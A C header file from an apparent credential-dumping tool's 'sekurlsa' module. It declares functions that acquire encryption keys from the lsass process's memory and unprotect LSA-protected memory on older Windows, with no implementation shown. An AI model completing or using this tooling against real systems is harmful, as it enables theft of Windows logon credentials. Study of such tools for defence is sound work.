/*	paparas DELPY `gamidiaaktinidio`
	http://blog.gamidiaaktinidio.com
	paparas@gamidiaaktinidio.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "../globals_sekurlsa.h"
#if !defined(_M_ARM64)
NTSTATUS kuhl_m_sekurlsa_nt5_init();
NTSTATUS kuhl_m_sekurlsa_nt5_clean();
PLSA_PROTECT_MEMORY kuhl_m_sekurlsa_nt5_pLsaProtectMemory, kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory;

BOOL kuhl_m_sekurlsa_nt5_isOld(DWORD osBuildNumber, DWORD moduleTimeStamp);
NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule);
BOOL kuhl_m_sekurlsa_nt5_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PBYTE Key, SIZE_T taille);

NTSTATUS kuhl_m_sekurlsa_nt5_LsaInitializeProtectedMemory();
VOID kuhl_m_sekurlsa_nt5_LsaCleanupProtectedMemory();
#endif